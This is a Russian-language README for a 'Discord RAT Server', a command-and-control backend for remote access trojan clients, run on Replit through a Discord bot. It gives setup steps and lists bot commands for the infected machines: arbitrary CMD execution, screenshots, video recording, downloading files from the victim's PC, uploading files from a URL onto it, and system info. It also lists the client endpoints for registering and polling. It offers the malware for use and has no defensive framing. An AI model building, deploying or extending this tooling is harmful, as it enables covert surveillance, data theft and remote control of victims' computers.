# Discord RAT Server

Сервер для управления RAT клиентами через Discord бота.

## Установка на Replit

1. Создай новый Repl (Python)
2. Загрузи файлы `main.py` и `requirements.txt`
3. Добавь Secret (переменную окружения):
   - Key: `DISCORD_BOT_TOKEN`
   - Value: твой токен бота из Discord Developer Portal

## Создание Discord бота

1. Иди на https://discord.com/developers/applications
2. Создай New Application
3. Во вкладке Bot:
   - Создай бота
   - Скопируй TOKEN
   - Включи все Privileged Gateway Intents
4. Во вкладке OAuth2 → URL Generator:
   - Выбери scopes: `bot`
   - Выбери permissions: `Administrator`
   - Скопируй ссылку и добавь бота на свой сервер

## Команды бота

- `!clients` - список всех подключённых клиентов
- `!cmd <client_id> <command>` - выполнить команду CMD
- `!screenshot <client_id>` - сделать скриншот
- `!video <client_id> [duration]` - записать видео (по умолчанию 15 сек)
- `!download <client_id> <filepath>` - скачать файл с ПК
- `!upload <client_id> <url> <save_path>` - загрузить файл на ПК
- `!sysinfo <client_id>` - информация о системе

## API эндпоинты (для клиентов)

- `POST /register` - регистрация нового клиента
- `POST /poll` - получение команд
- `POST /response` - отправка ответа

## Запуск

```bash
python main.py
```

Сервер запустится на порту 8080.
